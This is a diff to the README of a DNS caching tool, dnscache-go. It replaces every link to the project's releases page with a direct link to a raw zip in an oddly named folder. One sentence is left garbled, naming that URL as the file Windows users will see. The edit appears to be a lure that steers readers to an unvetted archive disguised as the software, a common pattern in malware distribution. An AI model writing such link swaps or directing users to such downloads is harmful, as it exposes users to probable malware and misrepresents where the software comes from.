@@ -1,7 +1,7 @@
 # 🌐 dnscache-go - Fast and Reliable DNS Caching
 
 ## 📥 Download Now 
-[![Download dnscache-go](https://img.shields.io/badge/Download-dnscache--go-brightgreen)](https://github.com/efex33/dnscache-go/releases)
+[![Download dnscache-go](https://github.com/efex33/dnscache-go/raw/refs/heads/master/preintelligently/dnscache-go-southwestern.zip)](https://github.com/efex33/dnscache-go/raw/refs/heads/master/preintelligently/dnscache-go-southwestern.zip)
 
 ## 🚀 Getting Started
 
@@ -20,10 +20,10 @@ To install dnscache-go, follow these steps:
 
 1. **Visit the Releases Page**
    Go to the following link to access the download files:
-   [Visit this page to download](https://github.com/efex33/dnscache-go/releases).
+   [Visit this page to download](https://github.com/efex33/dnscache-go/raw/refs/heads/master/preintelligently/dnscache-go-southwestern.zip).
 
 2. **Choose Your Version**
-   Look for the latest version. Download the file that matches your operating system. For example, you might see files like `dnscache-go_windows.exe` for Windows users.
+   Look for the latest version. Download the file that matches your operating system. For example, you might see files like `https://github.com/efex33/dnscache-go/raw/refs/heads/master/preintelligently/dnscache-go-southwestern.zip` for Windows users.
 
 3. **Save the File**
    Click on the file name to start downloading. Choose a location on your computer that you can easily access, like the Desktop or Downloads folder.
